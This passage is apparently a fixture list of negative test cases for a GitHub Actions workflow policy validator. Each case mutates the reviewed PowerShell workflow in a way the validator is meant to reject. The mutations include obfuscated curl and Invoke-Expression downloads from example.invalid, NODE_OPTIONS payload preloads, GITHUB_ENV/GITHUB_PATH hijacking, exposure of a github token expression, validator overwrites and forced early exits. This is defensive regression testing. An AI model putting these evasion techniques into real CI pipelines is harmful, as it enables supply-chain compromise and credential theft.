  // Anchored through the comment that follows it, for the same reason as
  // T1-BUILD-041: the acquire step opens with the identical preference line and
  // now comes first in the file.
  ['T1-BUILD-099', 'early exit prepended to the credential cleanup step', 'build', (source) => replaceOnce(source, "          $ErrorActionPreference = 'Stop'\n          # git config exits 1", "          $ErrorActionPreference = 'Stop'\n          exit 0\n          # git config exits 1")],
  ['T1-BUILD-094', 'worktree walk loses its FIFO guard', 'build', (source) => replaceOnce(source, '                              if ($objFile.Length -eq 0) {', '                              if ($false) {')],
  ['T1-BUILD-095', 'git exclusion widened to a string prefix', 'build', (source) => replaceOnce(source, '                          if (($objAttributes -band [System.IO.FileAttributes]::Directory) -ne 0) {\n                              if ($strEntry -cne $strGitDirectory) { $objPending.Push($strEntry) }', '                          if (($objAttributes -band [System.IO.FileAttributes]::Directory) -ne 0) {\n                              if (-not $strEntry.StartsWith($strGitPrefix)) { $objPending.Push($strEntry) }')],
  ['T1-BUILD-096', 'generator job regains a token scope', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on: ubuntu-latest\n    permissions: {}\n', '  verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n')],
  ['T1-BUILD-091', 'worktree walk follows links again', 'build', (source) => replaceOnce(source, "                          if (($objAttributes -band [System.IO.FileAttributes]::ReparsePoint) -ne 0) {\n                              throw 'worktree: the working tree contains a link'\n                          }\n", '')],
  ['T1-BUILD-092', 'worktree walk recurses with AllDirectories', 'build', (source) => replaceOnce(source, '[System.IO.Directory]::EnumerateFileSystemEntries($objPending.Pop())', '[System.IO.Directory]::EnumerateFiles($objPending.Pop(), \'*\', [System.IO.SearchOption]::AllDirectories)')],
  ['T1-BUILD-093', 'worktree walk loads each file whole', 'build', (source) => replaceOnce(source, '                                  $objDigestMap[$strRelative] = [Convert]::ToBase64String($objSha.ComputeHash($objStream))\n', '                                  $objDigestMap[$strRelative] = [Convert]::ToBase64String($objSha.ComputeHash([System.IO.File]::ReadAllBytes($strEntry)))\n')],
  ['T1-BUILD-084', 'worktree byte comparison removed', 'build', (source) => replaceOnce(source, '          $objWorktreeAfter = Get-WorktreeFileDigestMap\n', '')],
  ['T1-BUILD-085', 'worktree snapshot taken after the generator', 'build', (source) => replaceOnce(source, '          $objWorktreeBefore = Get-WorktreeFileDigestMap\n', '')],
  ['T1-BUILD-083', 'control-surface digest framing removed', 'build', (source) => replaceOnce(source, "                      $arrLength = [System.BitConverter]::GetBytes([long]$arrComponent.Length)\n", '')],
  ['T1-BUILD-082', 'runner communication file check absent from verify', 'build', (source) => replaceOnce(source, "          foreach ($strChannel in $arrChannelPaths) {\n              if ([string]::IsNullOrEmpty($strChannel)) { throw 'runner-state: a step communication file path is unset' }\n              if ([System.IO.FileInfo]::new($strChannel).Length -ne 0) {\n                  throw 'runner-state: the generator wrote to a runner step communication file'\n              }\n          }\n", '')],
  ['T1-BUILD-081', 'probes reinherit global Git configuration', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_GLOBAL'] = '/dev/null'\n", '')],
  ['T1-BUILD-080', 'generated-artifact drift tolerated again', 'build', (source) => replaceOnce(source, "          if ($objDiff.ExitCode -eq 1) {\n              throw 'generated-artifacts: committed artifacts do not match generator output. Run ./.github/workflows/Generate-StyleGuideArtifacts.ps1 and commit the four regenerated files.'\n          }\n", '')],
  ['T1-BUILD-078', 'Git control-surface digest check removed', 'build', (source) => replaceOnce(source, "          if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {\n              throw 'git-state: the generator changed repository Git configuration or hooks'\n          }\n", '')],
  ['T1-BUILD-079', 'early exit inserted after the generator', 'build', (source) => replaceOnce(source, '          }\n\n          if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {', '          }\n          exit 0\n\n          if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {')],
  ['T1-BUILD-073', 'generator returned to in-session invocation', 'build', (source) => replaceOnce(source, '          $arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n', '          $arrGeneratorResult = @(& ./.github/workflows/Generate-StyleGuideArtifacts.ps1)\n')],
  ['T1-BUILD-074', 'Git resolved through a shadowable command lookup', 'build', (source) => replaceOnce(source, '              $objStartInfo.FileName = $strGitPath\n', '              $objStartInfo.FileName = @(Get-Command git -CommandType Application -ErrorAction Stop)[0].Source\n')],
  ['T1-BUILD-075', 'pinned Git path downgraded to a mutable variable', 'build', (source) => replaceOnce(source, "native-tool: Git application was not resolved' }\n          New-Variable -Name strGitPath -Value $strResolvedGit -Option Constant\n", "native-tool: Git application was not resolved' }\n          $strGitPath = $strResolvedGit\n")],
  ['T1-BUILD-076', 'push path added to the read-only workflow', 'build', (source) => replaceOnce(source, "          $objWorking = Invoke-GitRaw @('diff'", "          & git push origin HEAD:refs/heads/main\n          $objWorking = Invoke-GitRaw @('diff'")],
  ['T1-BUILD-077', 'repository mutation added to the read-only workflow', 'build', (source) => replaceOnce(source, "          $objWorking = Invoke-GitRaw @('diff'", "          & git add -A\n          $objWorking = Invoke-GitRaw @('diff'")],
  ['T1-MARKDOWN-021', 'captured lint status reset indirectly through Set-Variable', 'markdown', (source) => replaceOnce(source, '          $intNestedExit = $LASTEXITCODE\n', '          $intNestedExit = $LASTEXITCODE\n          Set-Variable -Name intPolicyExit -Value 0\n')],
  // The lint job runs repository-controlled code and both of its actions have
  // post steps that outlive it, so it must hold no scopes for the same reason
  // build.verify holds none.
  // The expression ban must hold in both files, not just build.yml.
  // Moved off the step name, which is now pinned outright rather than merely
  // permitted -- the governed steps assert every key they carry, so the
  // permitted-but-unpinned value this fixture used to exploit no longer exists
  // and a name mutation is answered by the name assertion instead. The run body
  // is where the ban is still the only thing standing in the way: the fragment
  // list requires text to be present and does not forbid text being added, and
  // the runner expands ${{ }} in a run body before any shell sees it, comment
  // or not.
  ['T1-MARKDOWN-023', 'expression reaching a credential in the lint step', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', "          $strAudit = '${{ github['token'] }}'\n          & $strNpmPath run lint:md\n")],
  // The step's one try exists to restore the caller's CI variable in finally.
  // Adding a catch beside it leaves every required fragment, phase order, and
  // captured status intact while a failed supply digest, install, or lint stops
  // deciding anything.
  ['T1-MARKDOWN-024', 'phase failure suppressed by a handler in the lint step', 'markdown', (source) => replaceLast(source, '          } finally {\n', '          } catch {\n          } finally {\n')],
  ['T1-MARKDOWN-025', 'script-wide error trap registered in the lint step', 'markdown', (source) => replaceLast(source, "          $strNodeVersion = (& $strNodePath --version).Trim()\n", "          trap { $null = $_ }\n          $strNodeVersion = (& $strNodePath --version).Trim()\n")],
  ['T1-MARKDOWN-026', 'action reintroduced into the lint job', 'markdown', (source) => replaceOnce(source, '      - name: Install and lint both Markdown surfaces\n', '      - name: Set up hosted Node.js\n        id: setup-node\n        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0\n        with:\n          node-version: \'24.18.1\'\n\n      - name: Install and lint both Markdown surfaces\n')],
  ['T1-MARKDOWN-027', 'Node archive fetched from an unreviewed location', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org/dist/v24.18.1/node-v24.18.1-linux-x64.tar.xz'\n", "          $strNodeUrl = 'https://example.invalid/node-v24.18.1-linux-x64.tar.xz'\n")],
  ['T1-MARKDOWN-028', 'reviewed Node archive digest replaced', 'markdown', (source) => replaceOnce(source, "          $strReviewedNodeSha256 = 'D6C664DF3F3F61458E8C277585571328522D705166723A7C7823A9253A4D15A0'\n", "          $strReviewedNodeSha256 = '0000000000000000000000000000000000000000000000000000000000000000'\n")],
  // The download is only as good as the check on what comes back.
  ['T1-MARKDOWN-029', 'downloaded Node archive no longer verified before use', 'markdown', (source) => replaceOnce(source, '          $strObservedNodeSha256 = (Get-FileHash -LiteralPath $strArchivePath -Algorithm SHA256).Hash\n          if ($strObservedNodeSha256 -cne $strReviewedNodeSha256) {\n              throw \'acquire: the Node archive does not match the reviewed digest\'\n          }\n', '')],
  // The network ban moved from the file to the step that runs repository code.
  ['T1-MARKDOWN-030', 'network client added to the lint step', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          $objExtra = Invoke-WebRequest -Uri https://example.invalid/rules\n          & $strNpmPath run lint:md\n')],
  // Mutates a line no named assertion covers, so it reaches the backstop
  // rather than being answered by one of the assertions in front of it.
  ['T1-MARKDOWN-031', 'acquire step edited without re-review', 'markdown', (source) => replaceOnce(source, '          & $strGitPath init --quiet .\n', '          & $strGitPath init .\n')],
  // A second request fetches bytes the reviewed archive digest never covered.
  ['T1-MARKDOWN-032', 'second download appended to the acquire step', 'markdown', (source) => replaceOnce(source, '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n', '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n          & $strCurlPath --silent --output $strNodeRoot/bin/node https://example.invalid/node\n')],
  // And one that needs no network at all, because the checkout is already on
  // disk by the time the extraction finishes.
  ['T1-MARKDOWN-033', 'extracted toolchain overwritten from the checkout', 'markdown', (source) => replaceOnce(source, '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n', '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n          Copy-Item -LiteralPath ./tools/node -Destination $strNodeRoot/bin/node -Force\n')],
  // The client name assembled at run time, so no literal to count.
  ['T1-MARKDOWN-034', 'network client invoked through an assembled name', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strClient = 'cu' + 'rl'\n          & $strClient --silent --output ./.github/workflows/Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  // PowerShell does not require whitespace after the call operator, and it
  // executes a command named by a parenthesised expression.
  ['T1-MARKDOWN-035', 'call operator applied to a parenthesised expression', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          &('cu' + 'rl') --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  // The lint assets must be re-verified after installation, immediately before
  // the phases that read them.
  // The re-check spans installation and is named for it. It was previously
  // named for a policy validation that ran later in the same job, which the
  // split moved to another machine; the assertion is the one it always was.
  ['T1-MARKDOWN-036', 'lint assets no longer re-verified after installation', 'markdown', (source) => replaceOnce(source, "          $strLintConfigAfterInstall = (Get-FileHash -LiteralPath .markdownlint.jsonc -Algorithm SHA256).Hash\n          $strLintHelperAfterInstall = (Get-FileHash -LiteralPath lint-nested-markdown.js -Algorithm SHA256).Hash\n          if ($strLintConfigAfterInstall -cne $strReviewedLintConfigHash -or $strLintHelperAfterInstall -cne $strReviewedLintHelperHash) {\n              throw 'supply: lint configuration or helper changed during installation'\n          }\n", '')],
  // Round 37, finding A, under the control that finally closed it. Ordering the
  // validator against the linters inside one job could only ever trade one
  // exposure for the other, so the fix is that they are not in one job: the
  // validator runs where no package code has executed. This fixture no longer
  // moves it -- a move is caught upstream by the policy step missing its own
  // required phase, which proves nothing about this rule -- it adds a second
  // invocation to the lint job, leaving the policy job intact so that the only
  // thing wrong with the file is the one thing under test.
  ['T1-MARKDOWN-037', 'policy validator also invoked in the job that runs the linters', 'markdown', (source) => {
    const strOuter = '          & $strNpmPath run lint:md\n';
    return replaceOnce(source, strOuter, '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n' + strOuter);
  }],
  // Round 37, finding B. Dynamic execution reaches a command without a call
  // operator and without a contiguous client name, so neither the invocation
  // allowlist nor the network-client scan sees it.
  ['T1-MARKDOWN-038', 'network client reached through Invoke-Expression', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Invoke-Expression ('cu' + 'rl --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v')\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-039', 'assembled command name dot-sourced instead of called', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strClient = 'cu' + 'rl'\n          . $strClient --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-040', 'command started through the process API', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $objRun = [System.Diagnostics.Process]::Start('/usr/bin/curl', '-o ./x https://example.invalid/v')\n          $strNodeUrl = 'https://nodejs.org")],
  // Round 37, finding D. Terminating the process with status zero skips every
  // phase below without matching a statement-position control-flow token.
  ['T1-MARKDOWN-041', 'process terminated successfully before the lint phases', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          [System.Environment]::Exit(0)\n          & $strNpmPath run lint:md\n')],
  ['T1-MARKDOWN-042', 'step status forced to success through the host', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          $host.SetShouldExit(0)\n          & $strNpmPath run lint:md\n')],
  // Round 38, finding F. The validator runs after both lint phases, so the
  // baseline it compares its parsed text against must be recorded before any
  // third-party package in this job has executed.
  ['T1-MARKDOWN-043', 'workflow digest baseline no longer recorded before installation', 'markdown', (source) => replaceOnce(source, '          $env:T1_EXPECTED_BUILD_DIGEST = (Get-FileHash -LiteralPath ./build.yml -Algorithm SHA256).Hash\n', '')],
  ['T1-MARKDOWN-044', 'workflow digest baseline recorded after the lint phases', 'markdown', (source) => {
    const strBaseline = '          $env:T1_EXPECTED_MARKDOWN_DIGEST = (Get-FileHash -LiteralPath ./markdownlint.yml -Algorithm SHA256).Hash\n';
    const strValidator = '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n';
    return replaceOnce(replaceOnce(source, strBaseline, ''), strValidator, strBaseline + strValidator);
  }],
  // Round 38, finding B follow-up: a bare script path is an invocation by
  // literal name that the call/dot-source scan cannot see.
  // Written without a leading ./ deliberately. PowerShell executes a bare
  // relative path -- verified on 7.6.4, `tools/prepare.ps1` ran -- and that
  // spelling escapes the dot-source scan entirely, since there is no dot at
  // statement position. It is the form the script-path rule exists for.
  ['T1-MARKDOWN-045', 'script path invoked bare from the acquire step', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          tools/prepare.ps1\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-BUILD-134', 'script path invoked bare from the build acquire step', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', '          tools/prepare.ps1\n          $strServerUrl = $env:GITHUB_SERVER_URL\n')],
  // Round 39. PowerShell's assignment grammar permits a statement on the
  // right-hand side, so the dot is preceded by = rather than a statement
  // separator -- verified on 7.6.4, `$null = . $p` dot-sourced.
  ['T1-MARKDOWN-046', 'command dot-sourced from an assignment right-hand side', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strClient = 'cu' + 'rl'\n          $null = . $strClient --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  // A native interpreter runs an arbitrary command string using neither
  // PowerShell invocation operator and with no contiguous client name.
  ['T1-MARKDOWN-047', 'command string executed through a native interpreter', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strCommand = 'cu' + 'rl --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v'\n          /bin/bash -c $strCommand\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-BUILD-135', 'command string executed through a native interpreter in the build acquire step', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', "          $strCommand = 'gi' + 't fetch https://example.invalid/x'\n          bash -c $strCommand\n          $strServerUrl = $env:GITHUB_SERVER_URL\n")],
  // $GITHUB_ENV applies to every later step, so NODE_OPTIONS=--require
  // preloads repository code into npm and the validator without touching a
  // reviewed file, a version probe or a captured status.
  ['T1-MARKDOWN-048', 'acquire step exports options to later steps', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Add-Content -Path $env:GITHUB_ENV -Value 'NODE_OPTIONS=--require=/tmp/payload.js'\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-BUILD-136', 'build acquire step exports options to later steps', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', "          Add-Content -Path $env:GITHUB_PATH -Value '/tmp/hijack'\n          $strServerUrl = $env:GITHUB_SERVER_URL\n")],
  // npm reads a per-user and a global config outside the repository tree, so
  // script-shell in either replaces the interpreter for both lint phases.
  ['T1-MARKDOWN-049', 'npm user and global configuration no longer neutralized', 'markdown', (source) => replaceOnce(source, "          $env:npm_config_userconfig = '/dev/null'\n", '')],
  // The name is split by a backtick inside "$(...)". PowerShell strips the
  // escape and runs curl; before the subexpression span was re-projected, the
  // token view kept the backtick and the network-client scan read no name.
  ['T1-MARKDOWN-056', 'network client escaped by a backtick inside an expandable subexpression', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          $null = "$(cu`rl --output ./rules https://example.invalid/rules)"\n          & $strNpmPath run lint:md\n')],
  // A literal client in the acquire step: named outright, so no assembly and no
  // computed invocation for the & and . rules to catch. Until NETWORK_CLIENT
  // was applied here this fell through to the digest, which is not a defence
  // once the digest is re-baselined in the same edit.
  ['T1-MARKDOWN-057', 'literal network client named in the acquire step', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $objResponse = Invoke-WebRequest -Uri https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-058', 'network client reached through a computed New-Object type name', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $objClient = New-Object -TypeName ('System.Net.' + 'WebClient')\n          $objClient.DownloadFile($strA, $strB)\n          $strNodeUrl = 'https://nodejs.org")],
  // The validator replaced by a file copy rather than a download: no network
  // client, no assembled command name, and the .mjs target sits inside a
  // quoted string the projection blanks, so the script-path rule cannot see it
  // either. Only the static-call allowlist stands in the way.
  ['T1-MARKDOWN-059', 'validator overwritten through an unreviewed static writer', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          [System.IO.File]::Copy('./payload', './.github/workflows/Validate-WorkflowPolicy.mjs', $true)\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-060', 'static member reached through a computed name', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          [System.IO.File]::$strMethod('./payload', './.github/workflows/Validate-WorkflowPolicy.mjs')\n          $strNodeUrl = 'https://nodejs.org")],
  // Provenance for the reviewed command variables. Each of these leaves the
  // invocation allowlist satisfied -- the tail still calls $strCurlPath -- and
  // changes what that name is bound to.
  // A cmdlet is neither a static call nor an & / dot invocation, so the static
  // allowlist did not see it and the quoted .mjs target is blanked from
  // stepCode. Only the cmdlet allowlist stands in the way.
  ['T1-MARKDOWN-065', 'validator overwritten by an unreviewed cmdlet', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Copy-Item -LiteralPath './payload.mjs' -Destination './.github/workflows/Validate-WorkflowPolicy.mjs' -Force\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-061', 'constant binding replaced by a plain assignment', 'markdown', (source) => replaceOnce(source, '          New-Variable -Name strCurlPath -Value $strResolvedCurl -Option Constant', "          $strCurlPath = './payload'")],
  ['T1-MARKDOWN-062', 'reviewed binding kept while its resolution source is rebound', 'markdown', (source) => replaceOnce(source, "$strResolvedCurl = @('/usr/bin/curl', '/bin/curl')", "$strResolvedCurl = @('./payload')")],
  ['T1-MARKDOWN-063', 'reviewed target rebound by a second New-Variable', 'markdown', (source) => replaceOnce(source, '          New-Variable -Name strCurlPath -Value $strResolvedCurl -Option Constant', "          New-Variable -Name strCurlPath -Value $strResolvedCurl -Option Constant\n          New-Variable -Name strCurlPath -Value './payload' -Force")],
  ['T1-MARKDOWN-064', 'reviewed target assigned after its constant binding', 'markdown', (source) => replaceOnce(source, '          New-Variable -Name strCurlPath -Value $strResolvedCurl -Option Constant', "          New-Variable -Name strCurlPath -Value $strResolvedCurl -Option Constant\n          $strCurlPath = './payload'")],
  // Round 40. An absent name under RUNNER_TEMP is absent only until the first
  // lint phase creates it, and the second phase then loads it.
  // Round 41. Two constructs the projection introduced one round earlier could
  // not see: a block comment supplying text the checks required, and a network
  // request inside an expandable-string subexpression. Both are edits to the
  // acquire step, whose reviewed digest is asserted before any semantic rule
  // runs, so the digest is what rejects them and these are digest regression
  // guards. The evidence that the *projection* now sees both -- along with a
  // backtick-escaped cu`rl -- is the direct exercise recorded in the commit
  // message, not these fixtures. Saying so beats implying coverage they do not
  // give.
  ['T1-MARKDOWN-054', 'required generator lookup supplied by a block comment', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          <#\n          & $strCurlPath --output ./x https://example.invalid/p\n          #>\n          cu`rl --output ./x https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-055', 'network request hidden in an expandable-string subexpression', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $null = \"$(Invoke-WebRequest -OutFile ./x https://example.invalid/v)\"\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-050', 'npm configuration pointed back at a writable absent path', 'markdown', (source) => replaceOnce(source, "          $env:npm_config_userconfig = '/dev/null'\n", "          $env:npm_config_userconfig = [System.IO.Path]::Combine($env:RUNNER_TEMP, 'absent-user-npmrc')\n")],
  // Round 40. && was missing from the interpreter anchor, though the adjacent
  // dot-source scan already carried both pipeline-chain operators.
  ['T1-MARKDOWN-051', 'interpreter reached through a pipeline-chain operator', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          & $strGitPath status && /bin/bash -c $strPayload\n          $strNodeUrl = 'https://nodejs.org")],
  // Round 40. The five literal names are necessary and not sufficient:
  // 'GITHUB_' + 'ENV' contains none of them.
  ['T1-MARKDOWN-052', 'runner communication file reached through a computed name', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strComm = [Environment]::GetEnvironmentVariable('GITHUB_' + 'ENV')\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-053', 'text written outside the reviewed native tools', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          [System.IO.File]::AppendAllText($strTargetPath, 'NODE_OPTIONS=--require=./x')\n          $strNodeUrl = 'https://nodejs.org")],
  ['T1-MARKDOWN-022', 'lint job regains a token scope', 'markdown', (source) => replaceOnce(source, '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions: {}\n', '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n')],
  // Round 43, finding X: the job split. Each of these removes exactly one part
  // of the structure the split rests on, and each is checked to be rejected by
  // the rule that part belongs to rather than by a digest -- which is why the
  // two step digests were moved behind the cross-job rules.
  //
  // The whole-job deletions come first. They are the coarsest possible failure
  // and are listed anyway, because the split is a claim about which programs
  // run on which runner, and a file with one job satisfies every per-step
  // assertion in this validator while making that claim false.
  ['T1-MARKDOWN-066', 'policy job deleted, leaving the validator unrun', 'markdown', (source) => {
    const at = source.indexOf('  markdownlint:\n');
    if (at < 0) reject('fixture-harness', 'fixture source token is absent: the lint job');
    return source.slice(0, source.indexOf('  policy:\n')) + source.slice(at);
  }],
  ['T1-MARKDOWN-067', 'lint job deleted, leaving both Markdown surfaces unlinted', 'markdown', (source) => source.slice(0, source.indexOf('  markdownlint:\n'))],
  // A needs: edge is refused by the job key set rather than by a rule of its
  // own, for the same reason every other unreviewed job key is. The two jobs
  // are independent assertions about one commit; sequencing them would only let
  // the first failure hide the second.
  ['T1-MARKDOWN-068', 'lint job made to depend on the policy job', 'markdown', (source) => replaceOnce(source, '  markdownlint:\n    runs-on: ubuntu-latest\n', '  markdownlint:\n    needs: policy\n    runs-on: ubuntu-latest\n')],
  // The two directions of the exposure the split closes, one fixture each.
  // Both leave the rest of the file correct, so nothing but the rule under test
  // can reject them.
  ['T1-MARKDOWN-069', 'lint phase added to the job that validates policy', 'markdown', (source) => replaceOnce(source, '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n', '          & $strNpmPath run lint:md\n          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n')],
  // Each job fetches the triggering revision for itself, because each is a
  // separate runner with a separate empty workspace. Deleting one job's acquire
  // step leaves the other job's intact, so the file still contains a
  // digest-matching acquire step and only the per-job assertion can see it.
  ['T1-MARKDOWN-070', 'lint job stops acquiring its own revision', 'markdown', (source) => {
    const at = source.lastIndexOf('      - name: Acquire triggering revision and pinned toolchain without an action\n');
    if (at < 0 || at === source.indexOf('      - name: Acquire triggering revision and pinned toolchain without an action\n')) {
      reject('fixture-harness', 'fixture source token is absent: a second acquire step');
    }
    return source.slice(0, at) + source.slice(source.indexOf('      - name: Install and lint both Markdown surfaces\n'));
  }],
  // The preludes are required to be byte-identical, not merely to satisfy the
  // same fragment list twice. This edits a comment in the lint job's copy: every
  // fragment, phase order and captured status stays exactly as reviewed in both
  // steps, so the only thing left that can reject it is the identity rule.
  ['T1-MARKDOWN-071', 'supply prelude diverged between the two jobs', 'markdown', (source) => replaceLast(source, '          # Reviewed baseline. The before/after comparison further below proves\n', '          # Reviewed baseline.\n')],
  // The identity comparison slices at the first occurrence of the closing
  // statement, so a second copy of it would end the compared region early and
  // leave everything between the two copies outside the comparison entirely --
  // which is where divergent text would then go. Requiring exactly one is what
  // keeps "the preludes are identical" a statement about the whole prelude.
  // Round 44, findings B and C. Both spell a program the separation rules test
  // for as a contiguous string, and neither string appears contiguously, so
  // only the invocation allowlist can reject them. Measured accepted before it
  // existed, with the edited step's digest re-baselined.
  ['T1-MARKDOWN-073', 'validator invoked in the lint job through an assembled filename', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', "          $strValidatorPath = './Validate-' + 'WorkflowPolicy.mjs'\n          & $strNodePath $strValidatorPath ./build.yml ./markdownlint.yml\n          & $strNpmPath run lint:md\n")],
  ['T1-MARKDOWN-074', 'lint phase run in the policy job through an assembled script name', 'markdown', (source) => replaceOnce(source, '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n', "          & $strNpmPath run ('lint:' + 'md')\n          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n")],
  // The multiset is exact in both directions, so a reviewed invocation may not
  // be duplicated either -- a second frozen install between the gate and the
  // phases that trust it is a permitted command doing an unreviewed thing.
  ['T1-MARKDOWN-075', 'reviewed invocation repeated in the policy job', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath ci --ignore-scripts --no-audit --no-fund\n', '          & $strNpmPath ci --ignore-scripts --no-audit --no-fund\n              & $strNpmPath ci --ignore-scripts --no-audit --no-fund\n')],
  // Round 45. The governed-step digest lost its only fixture to the command
  // allowlist, so this restores it with a mutation no named rule models: a
  // comment, which the projection blanks, in the lint tail rather than the
  // shared prelude, which is compared between jobs before the digest runs.
  ['T1-MARKDOWN-076', 'governed step edited without re-review', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          # unreviewed edit\n          & $strNpmPath run lint:md\n')],
  // Finding C, both jobs and both spellings the report named. The assembled
  // script name is deliberate: it is what defeated the raw-text separation
  // rules, and it must not matter here, because this rule reads the command
  // name and never the arguments.
  ['T1-MARKDOWN-077', 'package script run bare in the policy job', 'markdown', (source) => replaceOnce(source, '          $boolCiExisted = Test-Path Env:CI\n', "          npm run ('lint:' + 'md')\n          $boolCiExisted = Test-Path Env:CI\n")],
  // Not the validator by name: that is caught earlier, and correctly, by the
  // cross-job separation rule. What this isolates is the lint job's call site of
  // the bare-command rule itself.
  ['T1-MARKDOWN-078', 'script path run bare from the lint job', 'markdown', (source) => replaceLast(source, '          $boolCiExisted = Test-Path Env:CI\n', '          tools/prepare.ps1\n          $boolCiExisted = Test-Path Env:CI\n')],
  // Finding B. Node interprets NODE_OPTIONS before the command line, so this
  // preloads a checkout-controlled module into every Node process the step
  // starts -- including the validator, in the job whose exit status is the
  // policy result.
  ['T1-MARKDOWN-079', 'Node preload configured in the policy job', 'markdown', (source) => replaceOnce(source, '          $boolCiExisted = Test-Path Env:CI\n', "          $env:NODE_OPTIONS = '--require=./payload.cjs'\n          $boolCiExisted = Test-Path Env:CI\n")],
  ['T1-MARKDOWN-080', 'Node preload configured in the lint job', 'markdown', (source) => replaceLast(source, '          $boolCiExisted = Test-Path Env:CI\n', "          $env:NODE_OPTIONS = '--require=./payload.cjs'\n          $boolCiExisted = Test-Path Env:CI\n")],
  // The $env: scan sees a literal name. This is the same write with the name
  // computed, which that scan cannot see and which the capability ban catches.
  ['T1-MARKDOWN-081', 'environment written through a computed name in the policy job', 'markdown', (source) => replaceOnce(source, '          $boolCiExisted = Test-Path Env:CI\n', "          [System.Environment]::SetEnvironmentVariable('NODE_' + 'OPTIONS', '--require=./payload.cjs')\n          $boolCiExisted = Test-Path Env:CI\n")],
  ['T1-MARKDOWN-082', 'policy-only environment baseline assigned in the lint job', 'markdown', (source) => replaceLast(source, '          $boolCiExisted = Test-Path Env:CI\n', '          $env:T1_EXPECTED_BUILD_DIGEST = (Get-FileHash -LiteralPath ./build.yml -Algorithm SHA256).Hash\n          $boolCiExisted = Test-Path Env:CI\n')],
  // Round 46. The braced spelling of the same write. Before the command-position
  // anchor was corrected this was rejected, but as a bare command named
  // env:NODE_OPTIONS -- the right outcome reported as the wrong rule.
